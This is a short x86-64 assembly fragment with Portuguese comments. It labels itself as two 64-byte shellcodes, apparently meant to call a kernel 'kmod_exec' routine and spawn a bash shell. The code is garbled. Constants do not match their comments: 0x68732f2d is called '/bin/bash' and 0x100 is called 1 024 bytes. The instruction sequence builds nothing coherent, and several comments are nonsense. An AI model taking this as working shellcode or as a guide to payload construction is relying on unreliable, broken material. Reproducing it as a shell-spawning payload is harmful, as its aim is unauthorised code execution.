; ------------------------------------------------------------
; 0x3f8 – shellcode de 64 bytes
        xor     rdx, rdx          ; limpa RDX
        mov     rax, 0x4c00000     ; endereço da função kmod_exec (kernel‑Linux)
        push    rdx               ; push return address
        call    rax                ; chamada de retorno

; ------------------------------------------------------------
;   shellcode “bash” (64 bytes)
        xor     rcx, rcx          ; limpa RCX
        mov     rdi, 0x68732f2d   ; “/bin/bash”
        mov     rsi, 0x00000100   ; buffer – 1 024 bytes
        push    rax                ; push 8‑byte (para *kmod_exec*)
        pop     rdx                ; recupera RDX
        add     rdi, [rdi]         ; ad. &‐? ;  &
        mov     rbx, 0x00001000   ; buffer‑size
        push    rdi                ; push 8‑byte (você´tá)
